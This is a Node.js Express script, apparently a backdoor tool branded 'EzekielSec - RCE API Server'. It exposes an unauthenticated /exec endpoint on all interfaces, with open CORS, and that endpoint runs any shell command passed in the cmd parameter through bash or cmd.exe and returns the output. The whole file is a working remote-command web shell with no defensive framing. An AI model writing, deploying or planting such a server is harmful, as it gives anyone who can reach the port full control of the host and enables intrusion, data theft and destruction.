#!/usr/bin/env node

const express = require('express');
const { exec } = require('child_process');
const app = express();
const PORT = process.env.PORT || 7777;

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// CORS for public access
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.header('Access-Control-Allow-Headers', 'Content-Type');
    if (req.method === 'OPTIONS') return res.sendStatus(200);
    next();
});

// Logging
app.use((req, res, next) => {
    console.log(`[${new Date().toISOString()}] ${req.method} ${req.url} - ${req.ip}`);
    next();
});

// Command execution endpoint
app.get('/exec', (req, res) => {
    const command = req.query.cmd;
    
    if (!command) {
        return res.status(400).json({
            success: false,
            error: 'No command provided. Use ?cmd=your_command'
        });
    }
    
    console.log(`Executing: ${command}`);
    
    // KEPT: Windows + Linux/Mac support
    exec(command, { 
        timeout: 60000,
        maxBuffer: 50 * 1024 * 1024,
        shell: process.platform === 'win32' ? 'cmd.exe' : '/bin/bash'
    }, (error, stdout, stderr) => {
        res.json({
            success: !error,
            command: command,
            stdout: stdout || '',
            stderr: stderr || '',
            error: error ? error.message : null,
            code: error ? error.code : 0,
            timestamp: new Date().toISOString()
        });
    });
});

// POST endpoint
app.post('/exec', (req, res) => {
    const command = req.body.cmd || req.body.command;
    if (!command) {
        return res.status(400).json({ success: false, error: 'No command provided' });
    }
    req.query.cmd = command;
    app.handle(req, res);
});

// Health check
app.get('/health', (req, res) => {
    res.json({ status: 'ok', port: PORT });
});

// 404 handler
app.use((req, res) => {
    res.status(404).json({ success: false, error: 'Endpoint not found. Use /exec?cmd=command' });
});

// Start server
app.listen(PORT, '0.0.0.0', () => {
    console.log(`\n========================================`);
    console.log(`EzekielSec - RCE API Server`);
    console.log(`========================================`);
    console.log(`Port: ${PORT}`);
    console.log(`Platform: ${process.platform}`);
    console.log(`Shell: ${process.platform === 'win32' ? 'cmd.exe' : '/bin/bash'}`);
    console.log(`Endpoint: http://0.0.0.0:${PORT}/exec?cmd=whoami`);
    console.log(`========================================\n`);
});

process.on('SIGINT', () => process.exit(0));